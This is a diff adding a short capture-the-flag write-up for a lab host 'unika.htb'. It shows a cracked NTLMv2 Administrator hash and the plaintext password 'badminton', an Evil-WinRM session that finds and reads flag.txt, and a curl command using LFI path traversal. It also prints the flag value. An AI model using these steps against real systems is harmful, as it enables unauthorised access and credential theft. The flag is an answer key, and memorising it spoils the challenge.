@@ -1,0 +1,34 @@
+## Cracked ntlmv2 hash
+```
+┌──(kali㉿kali)-[~]
+└─$ john --show unikaAdminNTLMv2Hash
+Administrator:badminton:RESPONDER:ffcf3b7592f7b33d:FB18D4E9A12A6D6AC99E50FA6054078B:010100000000000000C7ADA1C509DC01A9B0D34BAC58CE4B0000000002000800340047004600430001001E00570049004E002D00550054005900560058004B0039003900430054005A0004003400570049004E002D00550054005900560058004B0039003900430054005A002E0034004700460043002E004C004F00430041004C000300140034004700460043002E004C004F00430041004C000500140034004700460043002E004C004F00430041004C000700080000C7ADA1C509DC01060004000200000008003000300000000000000001000000002000008FDC718F278E7779B4355B103329AE8644A15C95BCF1FF8A5F8A8F57129643940A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360035000000000000000000
+
+1 password hash cracked, 0 left
+```
+
+# flag.txt
+```
+*Evil-WinRM* PS C:\Users\Administrator> get-childitem -path "C:\" -Filter "flag.txt" -Recurse
+
+
+    Directory: C:\Users\mike\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cat C:\Users\mike\Desktop\flag.txt
+ea81b7afddd03efaa0945333ed147fac
+```
+
+### bonus:
+In hindsight, LFI would have revealed the flag if the full path was known:
+```
+┌──(kali㉿kali)-[~]
+└─$ curl -s http://unika.htb/?page=../../users/mike/desktop/flag.txt | grep -Ev 'br|Failed'
+ea81b7afddd03efaa0945333ed147fac
+
+```
